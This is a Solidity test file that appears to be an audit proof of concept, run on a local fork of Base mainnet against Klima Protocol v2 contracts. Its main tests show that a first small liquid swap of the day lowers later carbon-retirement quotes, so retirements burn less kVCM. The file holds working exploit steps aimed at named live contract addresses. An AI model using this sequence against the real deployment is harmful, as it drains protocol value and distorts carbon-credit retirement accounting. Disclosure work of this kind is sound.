// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IQuoterRouterFacet} from "src/interfaces/AssetManager/IQuoterRouterFacet.sol";
import {IOperationsFacet} from "src/interfaces/AssetManager/IOperationsFacet.sol";
import {ICarbonClassVault} from "src/interfaces/ICarbonClassVault.sol";
import {IMaturityManager} from "src/interfaces/IMaturityManager.sol";
import {IProtocolMinter} from "src/interfaces/IProtocolMinter.sol";
import {IRewardManagerViewFacet} from "src/interfaces/RewardManager/IRewardManagerViewFacet.sol";
import {IRewardManager} from "src/interfaces/RewardManager/IRewardManager.sol";
import {CommonStructs} from "src/libraries/CommonStructs.sol";
import {ICarbonLedger} from "src/interfaces/ICarbonLedger.sol";

/// @notice Klima Protocol v2 — fase 2 fork PoC (Base mainnet fork, local only)
/// H-6: retirement quote under-burn via stored discounted-forward-balance (DFB)
/// H-DF: forward swaps dead because no discount-factor writer exists
/// H-GUARD: unprivileged calls into ProtocolMinter must revert
contract KlimaForkTest is Test {
    address constant AAM = 0x1C24239309398220883207681602BfF4D10fbde1;
    address constant REWARD_MANAGER = 0xada87d6f68054d0caB4789b332279b18932e928F;
    address constant MATURITY_MANAGER = 0x73E2Bd9Bb527c9E6c88E0F6B0239b7a473AE9224;
    address constant PROTOCOL_MINTER = 0xDF92D10E5A59BF0af8BAC192EB3Fd380857d3572;
    address constant KVCM = 0x00fBAC94Fec8D4089d3fe979F39454F48c71A65d;

    address attacker = address(0xA77ACC);

    // class vaults (scope-map §4)
    function _classes() internal pure returns (address[] memory c) {
        c = new address[](6);
        c[0] = 0x67CBBf776bFf742178693F5156C5F814C274ae14; // AVOIDED_DEFORESTATION
        c[1] = 0x4D6fce4eb76f093F5948DCb7ff4364427d70BcB8; // BCHAR
        c[2] = 0x1b597DA36AFa2E88c3DCa55b4143251d4EB0E3Da; // OAE
        c[3] = 0xf4699531e0a5F6e9351a36De3753Deaad329Bf45; // REGEN_CFC
        c[4] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; // SOLAR_PV_INDIA
        c[5] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; // WIND_INDIA
    }

    // one ERC20 credit per class (index-aligned with _classes); index 0 is ERC1155 -> skipped for swap
    function _credits() internal pure returns (address[] memory cr, uint256[] memory ids) {
        cr = new address[](6);
        ids = new uint256[](6);
        cr[0] = 0x3446c6Ab697caE41447266CF8Fd88c21a1BcBd1B;
        ids[0] = 4067623867; // ERC1155
        cr[1] = 0x504D8bf40AA6C79BaEc11f421f179CcB0E469729; // BCHAR PUR_527_2023
        cr[2] = 0x7e73347D87fe9F00AfbAafD19AA7F26Dec72FFd5; // OAE CMARK_2_2024 (checksummed below in test via low-level)
        cr[3] = 0x3D1bf942619cB9FC71543721Ef3D5496FAf283B8; // REGEN C02-003
        cr[4] = 0xCC52d6f36296884C2Fbe106Fce26851A30CAD886; // SOLAR UCR-80-2021
        cr[5] = 0x8Ee9abB81De5901e1Bf7d065270c73C6CDe6a684; // WIND UCR-121-2022
    }

    function _activeMaturities() internal view returns (uint256[] memory arr) {
        (uint256 first, uint256 last) = IMaturityManager(MATURITY_MANAGER).getActiveMaturityRange();
        uint256 n = last - first + 1;
        arr = new uint256[](n);
        for (uint256 i = 0; i < n; i++) arr[i] = first + i;
    }

    function _emptyCoupon() internal pure returns (ICarbonClassVault.CouponBurnParams memory) {
        return ICarbonClassVault.CouponBurnParams({tonnes: 0, from: address(0)});
    }

    /// Survey: log per-class tonnage split (liquid vs forward) at fork block.
    function test_surveyClasses() public {
        uint256[] memory mats = _activeMaturities();
        address[] memory classes = _classes();
        for (uint256 i = 0; i < classes.length; i++) {
            (uint256 total, uint256 liquid,,) = ICarbonClassVault(classes[i]).getVaultTonnes(mats);
            console.log("class", classes[i]);
            console.log("  totalTonnes ", total);
            console.log("  liquidTonnes", liquid);
            console.log("  forwardTonnes", total - liquid);
        }
    }

    function _allCredits() internal pure returns (address[] memory cls, address[] memory cr, uint256[] memory ids) {
        cls = new address[](27); cr = new address[](27); ids = new uint256[](27);
        cls[0] = 0x4D6fce4eb76f093F5948DCb7ff4364427d70BcB8; cr[0] = 0x504D8bf40AA6C79BaEc11f421f179CcB0E469729; ids[0] = 0;
        cls[1] = 0x4D6fce4eb76f093F5948DCb7ff4364427d70BcB8; cr[1] = 0xf20CB470AcdA661Ab02De3B7be43894e2aDe0B1c; ids[1] = 0;
        cls[2] = 0xf4699531e0a5F6e9351a36De3753Deaad329Bf45; cr[2] = 0x3D1bf942619cB9FC71543721Ef3D5496FAf283B8; ids[2] = 0;
        cls[3] = 0xf4699531e0a5F6e9351a36De3753Deaad329Bf45; cr[3] = 0xE6628083Ab9A9Ab235e80f63e7ecd810B54A71B8; ids[3] = 0;
        cls[4] = 0xf4699531e0a5F6e9351a36De3753Deaad329Bf45; cr[4] = 0xb77A0be47A686c525a38fbb10c0D424929471d7D; ids[4] = 0;
        cls[5] = 0x1b597DA36AFa2E88c3DCa55b4143251d4EB0E3Da; cr[5] = 0x7e73347D87fe9F00AfbAafD19AA7F26Dec72FFd5; ids[5] = 0;
        cls[6] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[6] = 0xCC52d6f36296884C2Fbe106Fce26851A30CAD886; ids[6] = 0;
        cls[7] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[7] = 0xD35ce097b124AD93d972A9c0f33b9503548f6210; ids[7] = 0;
        cls[8] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[8] = 0x5a39700436dc2F124fe04d963c46197BB212E482; ids[8] = 0;
        cls[9] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[9] = 0xf218ACD83d1593e985E3ec7Ed95306A04998DC18; ids[9] = 0;
        cls[10] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[10] = 0xFC978C0Ae3e7aD8eDc6655d9C38Bd61f210cD8Bf; ids[10] = 0;
        cls[11] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[11] = 0xF1965ac1c0c5bDfDbCb4f3942B2e96040c6f9BE7; ids[11] = 0;
        cls[12] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[12] = 0x2037ecA75Ad1f6f7B28D8ed745C0E0954e383758; ids[12] = 0;
        cls[13] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[13] = 0x10772cdf6105d09FD8Ab20996E5a4B9B59Ba3907; ids[13] = 0;
        cls[14] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[14] = 0x9623E6c969dc54F1972EB8B311Eb9ed4cEBc5E3e; ids[14] = 0;
        cls[15] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[15] = 0x61F7B8BFB4C22620Db3340D45682898bBd378fF7; ids[15] = 0;
        cls[16] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[16] = 0x49655fbcc66D0EA6C3d0029d60E6762563AE4b82; ids[16] = 0;
        cls[17] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[17] = 0xcb4D420fBCC9F4319495e4139af37d47BECbD031; ids[17] = 0;
        cls[18] = 0x1ff9Bd464155D32FD2f9d302008D38544C0ae371; cr[18] = 0xc532b6f31e4B75557bADD24B189fc43663F1BCf4; ids[18] = 0;
        cls[19] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[19] = 0x8Ee9abB81De5901e1Bf7d065270c73C6CDe6a684; ids[19] = 0;
        cls[20] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[20] = 0x91c9c6ADBaEe59bC05CD2F0d687Bbb50AbEb515B; ids[20] = 0;
        cls[21] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[21] = 0x8528f4cD40b56e18dB7145A48b545Cb9FB85B293; ids[21] = 0;
        cls[22] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[22] = 0x3bF21F28262eFfF8E2d30be3818e3B88539D7CCB; ids[22] = 0;
        cls[23] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[23] = 0x270fF9B9C8B3D0403f14c7AB916c8721280fBBa3; ids[23] = 0;
        cls[24] = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; cr[24] = 0x625df8076e4bD6E4B6196A2A7Cb79fB3b19068EF; ids[24] = 0;
        cls[25] = 0x67CBBf776bFf742178693F5156C5F814C274ae14; cr[25] = 0x3446c6Ab697caE41447266CF8Fd88c21a1BcBd1B; ids[25] = 4067623867;
        cls[26] = 0x67CBBf776bFf742178693F5156C5F814C274ae14; cr[26] = 0x3446c6Ab697caE41447266CF8Fd88c21a1BcBd1B; ids[26] = 2383554144;
    }

    /// Survey: liquid tonnes per credit per class, to choose PoC inputs from live state.
    function test_surveyCredits() public {
        (address[] memory cls, address[] memory cr, uint256[] memory ids) = _allCredits();
        for (uint256 i = 0; i < cls.length; i++) {
            uint256 liq = ICarbonClassVault(cls[i]).getLiquidTokenTonnes(cr[i], ids[i]);
            if (liq > 0) {
                console.log("idx", i);
                console.log("  class", cls[i]);
                console.log("  credit", cr[i]);
                console.log("  liquidTonnes", liq);
            }
        }
    }

    /// H-DF evidence: every live discount factor is zero and forward swap quote reverts.
    function test_noDiscountFactors_forwardSwapReverts() public {
        (uint256 idx,,,) = IMaturityManager(MATURITY_MANAGER).getAdjacentMidnightInfo(block.timestamp);
        (IRewardManager.MaturityDiscountFactor[] memory dfs,) =
            IRewardManagerViewFacet(REWARD_MANAGER).getDiscountFactors(idx);
        uint256 nonzero;
        for (uint256 i = 0; i < dfs.length; i++) {
            if (dfs[i].discountFactor != 0) nonzero++;
        }
        console.log("discountFactors today:", dfs.length, "nonzero:", nonzero);
        assertEq(nonzero, 0, "expected all discount factors zero (no writer)");

        // forward swap quote must revert (NoDiscountFactorForMaturity / ZeroDiscountFactor)
        uint256 firstActive = IMaturityManager(MATURITY_MANAGER).getFirstActiveMaturityId();
        address[] memory classes = _classes();
        (address[] memory credits, uint256[] memory ids) = _credits();
        vm.expectRevert();
        IQuoterRouterFacet(AAM).getSwapQuote(classes[1], credits[1], ids[1], 1e18, firstActive, _emptyCoupon());
    }

    /// H-GUARD evidence: unprivileged direct mint calls revert.
    function test_unprivilegedMintGuards() public {
        vm.startPrank(attacker);
        vm.expectRevert();
        IProtocolMinter(PROTOCOL_MINTER).mintKvcmToAAM(1e18);
        vm.expectRevert();
        IProtocolMinter(PROTOCOL_MINTER).mintKvcmToRewardManager(1e18);
        vm.expectRevert();
        IProtocolMinter(PROTOCOL_MINTER).transferK2ToRewardManager(1e18);
        vm.stopPrank();
    }

    /// H-6 main proof (mechanism, with forward tonnage seeded through the protocol's
    /// own liquidity path): on a fresh day a retirement is priced against rawLiquid
    /// only (the protocol's patched, conservative path). After ANY first liquid swap
    /// of the day, the AAM stores DFB = totalTonnes - liquidSupplyForQuote (forwards
    /// UNDISCOUNTED). A later retirement the same day is then priced against
    /// rawLiquid + storedDFB and burns LESS kVCM for identical tonnes.
    function test_retireQuoteDropsAfterLiquidSwap_seededForwards() public {
        address ledger = 0xAD87E90614276430b25801Dfc0C76E01e309d6E1;
        address multisig = 0xD23CCDc650b2a5709e0Eb3C7e68B9C77c20e361b;

        // --- move to a fresh midnight so the DFB record for "today" is untouched ---
        (uint256 idx,, uint256 nextIdx, uint256 nextTs) =
            IMaturityManager(MATURITY_MANAGER).getAdjacentMidnightInfo(block.timestamp);
        console.log("current midnightIndex", idx, "-> warping to", nextIdx);
        vm.warp(nextTs + 120);
        (uint256 todayIdx,,,) = IMaturityManager(MATURITY_MANAGER).getAdjacentMidnightInfo(block.timestamp);
        assertEq(todayIdx, nextIdx);

        // --- pick SOLAR class (largest live liquidity) + a UCR credit with liquid tonnes ---
        address cls = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; // WIND_INDIA
        address credit = 0x625df8076e4bD6E4B6196A2A7Cb79fB3b19068EF; // WIND credit, ~117k liquid tonnes live
        uint256 liqTok = ICarbonClassVault(cls).getLiquidTokenTonnes(credit, 0);
        console.log("WIND credit liquid tonnes", liqTok);
        require(liqTok >= 100e18, "credit liquid tonnes too small");

        uint256 firstActive = IMaturityManager(MATURITY_MANAGER).getFirstActiveMaturityId();
        console.log("firstActiveMaturityId", firstActive);

        // --- seed forward tonnage via the protocol's own liquidity path ---
        // (in production this is how forward carbon enters vaults: liquidity manager
        //  deposits via CarbonLedger; here the tokens are the test's own dealt credits)
        uint256 fwdTonnes = 20000e18;
        uint256 fwdAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(fwdTonnes, credit, 0);
        deal(credit, attacker, fwdAmt);
        vm.prank(attacker);
        IERC20(credit).approve(cls, fwdAmt);
        vm.prank(multisig);
        ICarbonLedger(ledger).addCreditLiquidityToClassVault(cls, credit, 0, firstActive, attacker, fwdAmt, _emptyCoupon());

        uint256[] memory mats = _activeMaturities();
        (uint256 total, uint256 liquid,,) = ICarbonClassVault(cls).getVaultTonnes(mats);
        console.log("after seed total", total);
        console.log("after seed liquid", liquid);
        console.log("after seed forward", total - liquid);
        assertGt(total - liquid, 0, "forward seeding failed");

        // --- baseline retirement quote (fresh day, DFB uninitialized -> denominator rawLiquid) ---
        uint256 retireTonnes = liqTok / 4;
        if (retireTonnes > 100e18) retireTonnes = 100e18;
        uint256 retireAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(retireTonnes, credit, 0);
        (uint256 t0, uint256 priceBefore,,) =
            IQuoterRouterFacet(AAM).getRetirementQuote(cls, credit, 0, retireAmt, _emptyCoupon());
        console.log("retire tonnes quoted", t0);
        console.log("retire price BEFORE swap (kVCM)", priceBefore);
        require(priceBefore > 0, "baseline quote zero");

        (bool initBefore, uint256 storedBefore) =
            IQuoterRouterFacet(AAM).getDiscountedForwardBalanceRecordForIndex(todayIdx, cls);
        console.log("DFB before stored", storedBefore);
        assertFalse(initBefore, "fresh day DFB should be uninitialized");

        // --- attacker performs a small liquid swap (first tx of the day for this class) ---
        uint256 swapAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(1e18, credit, 0);
        deal(credit, attacker, swapAmt);
        vm.startPrank(attacker);
        IERC20(credit).approve(AAM, swapAmt);
        IERC20(credit).approve(cls, swapAmt); // vault pulls the deposit directly
        uint256 liquidMaturityId = firstActive > 0 ? firstActive - 1 : 0;
        uint256 kvcmOut = IOperationsFacet(AAM)
            .swapCarbonCreditForKvcm(
                IOperationsFacet.SwapCarbonCreditForKvcmParams({
                    carbonClass: cls,
                    credit: credit,
                    tokenId: 0,
                    maturityId: liquidMaturityId,
                    amount: swapAmt,
                    minKvcmOut: 0,
                    recipient: attacker,
                    couponBurnParams: _emptyCoupon()
                })
            );
        vm.stopPrank();
        console.log("swap kvcmOut", kvcmOut);
        assertGt(kvcmOut, 0);

        // --- DFB must now be stored (undiscounted forwards) ---
        (bool initAfter, uint256 storedAfter) =
            IQuoterRouterFacet(AAM).getDiscountedForwardBalanceRecordForIndex(todayIdx, cls);
        console.log("DFB after stored", storedAfter);
        assertTrue(initAfter, "DFB should be initialized by first swap");
        assertGt(storedAfter, 0, "stored DFB should be > 0 when forwards exist");

        // --- retirement quote after the swap: same tonnes must cost LESS kVCM ---
        (, uint256 priceAfter,,) = IQuoterRouterFacet(AAM).getRetirementQuote(cls, credit, 0, retireAmt, _emptyCoupon());
        console.log("retire price AFTER swap (kVCM) ", priceAfter);
        console.log("under-burn (kVCM)               ", priceBefore - priceAfter);
        console.log("under-burn bps                  ", (priceBefore - priceAfter) * 10000 / priceBefore);
        assertLt(priceAfter, priceBefore, "H-6 not reproduced: retire price did not drop");
    }

    /// H-6 end-to-end: after the DFB is stored by a first liquid swap, an actual
    /// retirement through the AAM (called by the RetirementAggregator, as in
    /// production) burns exactly the reduced quote -- not the fresh-day price.
    function test_actualRetireBurnsReducedQuote() public {
        address ledger = 0xAD87E90614276430b25801Dfc0C76E01e309d6E1;
        address multisig = 0xD23CCDc650b2a5709e0Eb3C7e68B9C77c20e361b;
        address ra = 0xdA0A793D7C32AB80bcdab7F8c725c96DB22464f4;

        (uint256 idx,, uint256 nextIdx, uint256 nextTs) =
            IMaturityManager(MATURITY_MANAGER).getAdjacentMidnightInfo(block.timestamp);
        console.log("midnightIndex", idx, "-> warp to", nextIdx);
        vm.warp(nextTs + 120);

        address cls = 0x0008f35758a4318942EcB5d5414116ce7B1Ede2d; // WIND_INDIA
        address credit = 0x625df8076e4bD6E4B6196A2A7Cb79fB3b19068EF;
        uint256 firstActive = IMaturityManager(MATURITY_MANAGER).getFirstActiveMaturityId();

        // seed 20,000 forward tonnes via protocol liquidity path
        uint256 fwdAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(20000e18, credit, 0);
        deal(credit, attacker, fwdAmt);
        vm.prank(attacker);
        IERC20(credit).approve(cls, fwdAmt);
        vm.prank(multisig);
        ICarbonLedger(ledger).addCreditLiquidityToClassVault(cls, credit, 0, firstActive, attacker, fwdAmt, _emptyCoupon());

        // baseline (fresh-day) price for 100 tonnes
        uint256 retireAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(100e18, credit, 0);
        (, uint256 priceBefore,,) =
            IQuoterRouterFacet(AAM).getRetirementQuote(cls, credit, 0, retireAmt, _emptyCoupon());
        console.log("fresh-day retire price", priceBefore);

        // first liquid swap of the day stores undiscounted DFB
        uint256 swapAmt = ICarbonClassVault(cls).convertTonnesToTokenAmount(1e18, credit, 0);
        deal(credit, attacker, swapAmt);
        vm.startPrank(attacker);
        IERC20(credit).approve(AAM, swapAmt);
        IERC20(credit).approve(cls, swapAmt);
        IOperationsFacet(AAM)
            .swapCarbonCreditForKvcm(
                IOperationsFacet.SwapCarbonCreditForKvcmParams({
                    carbonClass: cls,
                    credit: credit,
                    tokenId: 0,
                    maturityId: firstActive - 1,
                    amount: swapAmt,
                    minKvcmOut: 0,
                    recipient: attacker,
                    couponBurnParams: _emptyCoupon()
                })
            );
        vm.stopPrank();

        (, uint256 priceAfter,,) =
            IQuoterRouterFacet(AAM).getRetirementQuote(cls, credit, 0, retireAmt, _emptyCoupon());
        console.log("post-swap retire price ", priceAfter);
        assertLt(priceAfter, priceBefore);

        // actual retirement: attacker holds kVCM, RA triggers AAM retire
        deal(KVCM, attacker, priceAfter);
        vm.prank(attacker);
        IERC20(KVCM).approve(AAM, priceAfter);
        uint256 supplyBefore = IERC20(KVCM).totalSupply();
        vm.prank(ra);
        IOperationsFacet(AAM)
            .retireCarbonCreditViaAggregator(
                IOperationsFacet.RetireCarbonCreditViaAggregatorParams({
                    carbonClass: cls,
                    credit: credit,
                    tokenId: 0,
                    amount: retireAmt,
                    maxKvcmIn: priceAfter,
                    payer: attacker,
                    couponBurnParams: _emptyCoupon()
                })
            );
        uint256 burned = supplyBefore - IERC20(KVCM).totalSupply();
        console.log("kVCM actually burned   ", burned);
        console.log("under-burn vs fresh-day", priceBefore - burned);
        assertEq(burned, priceAfter, "burn should equal reduced quote");
        assertLt(burned, priceBefore, "burn must be below fresh-day price");
    }
}
